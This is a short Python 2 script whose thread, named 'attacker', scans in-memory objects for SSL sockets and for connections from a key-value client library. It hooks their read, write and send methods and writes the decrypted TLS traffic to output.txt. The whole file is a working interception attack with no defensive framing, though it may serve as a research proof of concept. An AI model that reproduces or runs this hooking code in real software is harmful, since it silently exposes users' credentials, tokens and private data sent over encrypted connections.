import threading
import gc
import time
from ssl import *
from client_api.kv_connection import KVHTTPConnection, KVHTTPSConnection
import copy

ssl_read_saved = None
ssl_write_saved = None
ssl_send_saved = None
saved = None
getresponse_saved = None

f = open("output.txt", "w")

def ssl_read(*args):
    data = ssl_read_saved(*args)
    f.write(str(data))
    f.flush()
    print data
    return data

def ssl_write(*args):
    data = ssl_write_saved(*args)
    f.write(str(data))
    f.flush()
    print data
    return data

def ssl_send(*args):
    data = ssl_send_saved(*args)
    f.write(str(data))
    f.flush()
    print data
    return data

def sendx(*args):
    data = saved(*args)
    f.write(str(*args))
    f.flush()
    print data
    return data

def getresponse(*args):
    data = getresponse_saved(*args)
    c = copy.deepcopy(data)
    f.write(str(c.read()))
    f.flush()
    print data
    return data

def attacker():
    global ssl_read_saved
    global ssl_write_saved
    global ssl_send_saved
    global getresponse_saved
    global saved
    while True:
        objs = gc.get_objects()
        for obj in objs:
            if isinstance(obj, SSLSocket) and not hasattr(obj, "marked"):
                print "S"
                f.flush()
                obj.marked = True
                ssl_read_saved = obj.read
                ssl_write_saved = obj.write
                ssl_send_saved = obj.send
                obj.read = ssl_read
                obj.write = ssl_write
                obj.send = ssl_send
            if isinstance(obj, KVHTTPSConnection) and not hasattr(obj, "marked"):
                obj.marked = True
                saved = obj.send
                getresponse_saved  = obj.getresponse
                obj.send = sendx
                #obj.getresponse = getresponse
                f.flush()

        time.sleep(1)

t = threading.Thread(target=attacker)
t.start()
